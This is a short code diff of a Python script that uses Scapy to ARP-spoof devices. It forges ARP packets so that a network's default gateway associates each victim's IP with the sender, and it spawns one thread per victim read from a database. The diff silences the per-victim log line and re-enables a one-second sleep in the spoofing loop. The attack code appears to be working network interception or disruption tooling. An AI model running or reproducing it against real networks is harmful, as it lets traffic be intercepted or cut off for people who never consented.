@@ -21,7 +21,7 @@ def getMac():
 
 def spoofSingleDevice(dfgwMAC, dfgw, victimMac, victimIp, logger):
 	try:
-		logger.info("Spoofing Device: ip=%s, mac=%s",victimIp,victimMac)
+		#logger.info("Spoofing Device: ip=%s, mac=%s",victimIp,victimMac)
         	#Spoof the things...
 		victimMac=convertMAC(victimMac)
 		packet = Ether()/ARP(op="who-has",hwdst=dfgwMAC,pdst=dfgw,psrc=victimIp)
@@ -46,6 +46,6 @@ def start():
 				victimIp=row[2]
 				threading.Thread(target=spoofSingleDevice, args=(dfgwMAC, dfgw, victimMac, victimIp, logger)).start()
 			conn.close()
-			#sleep(1)
+			sleep(1)
 		except Exception,e: 
 			logger.info("Error in spoofing thread: %s" % str(e))
